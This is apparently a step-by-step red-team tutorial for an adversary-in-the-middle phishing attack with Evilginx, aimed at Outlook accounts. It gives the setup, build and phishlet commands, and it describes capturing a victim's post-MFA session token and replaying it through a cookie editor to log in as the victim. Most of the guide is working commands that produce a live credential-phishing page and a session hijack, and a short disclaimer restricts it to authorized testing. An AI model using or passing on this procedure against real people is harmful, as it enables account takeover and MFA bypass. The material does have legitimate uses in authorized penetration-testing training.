# AiTM Attack PoC with Evilginx3 (Local Deployment)

**Author**: Bahtiyar Yusuf  
**Date**: Updated for Evilginx3 — July 2024  
**Purpose**: Demonstrate Adversary-in-the-Middle (AiTM) phishing attack using Evilginx3  
**Use Case**: Red team & educational use **only**

---

## 1. Register a Domain Name

Use any domain registrar to purchase a domain (preferably a cheap TLD):

- [Truehost](https://truehost.com/cloud/)
    
- [GoDaddy](https://www.godaddy.com/)
    
- [IONOS](https://www.ionos.com/)
    

---

## 2. Prepare Local Ubuntu/Kali Machine

Ensure you have:

- A machine running Ubuntu/Kali Linux
    
- Root access
    
- Open ports: **80**, **443**, **53** (used by Evilginx)
    

If running behind a NAT (home router), configure **port forwarding**:

- Forward TCP ports 80 and 443
    
- Forward UDP port 53
    

Alternatively, you can expose your local service using tools like:

- [Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/)
    
- [Ngrok](https://ngrok.com/) (limited SSL cert support for Evilginx)
    

---

## 3. Get Your Local IP

Find your local IP address:

```bash
ip a | grep inet
```

Example output: `192.168.1.100`

You’ll use this IP when configuring Evilginx.

---

## 4. Install Evilginx3 Locally

### Become root

```bash
sudo su -
apt update && apt upgrade -y
```

### Install dependencies

```bash
apt install curl git make -y
```

### Install Golang (latest supported)

```bash
curl -OL https://golang.org/dl/go1.21.6.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.21.6.linux-amd64.tar.gz
```

### Set Go environment

```bash
echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.profile
source ~/.profile
go version
```

---

## 5. Build and Run Evilginx3

```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2/
make
```

If you see port 53 error:

```bash
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 8.8.8.8" > /etc/resolv.conf
```

Then start Evilginx:

```bash
sudo ./bin/evilginx
```

---

## 6. Evilginx Configuration (Local IP or Public Domain)

If you're only testing locally:

```bash
config domain yourdomain.com
config ip 192.168.1.100
config redirect_url https://outlook.com
```

If you're using a real domain:

- Create A records for:
    
    - `account.yourdomain.com`
        
    - `login.yourdomain.com`
        
    - `outlook.yourdomain.com`
        
- Point them to your public IP (from ISP or port-forwarded router)
    

---

## 7. Setup and Use Outlook Phishlet

```bash
phishlets hostname outlook yourdomain.com
phishlets enable outlook
lures create outlook
lures edit 0 path mail
```

> Phishing URL: `https://outlook.yourdomain.com/mail`

---

## 8. Capture and Replay Session

1. Victim logs in → MFA prompt → Token captured
    
2. Use command:
    

```bash
sessions
sessions <id>
```

3. Copy token
    
4. Use **Cookie-Editor** browser extension:
    
    - Clear cookies
        
    - Import token
        
    - Navigate to `https://outlook.live.com/owa`
        

Boom 💥 — attacker is logged in as victim!

---

## 🔐 Legal Disclaimer

This guide is for **educational and authorized penetration testing purposes only**. Unauthorized access to systems is **illegal** and unethical.

---

## 📎 Reference

- Evilginx3 GitHub: [https://github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)
    
- Bahtiyar Yusuf on [LinkedIn](https://www.linkedin.com/in/bahtiyar-yusuf/)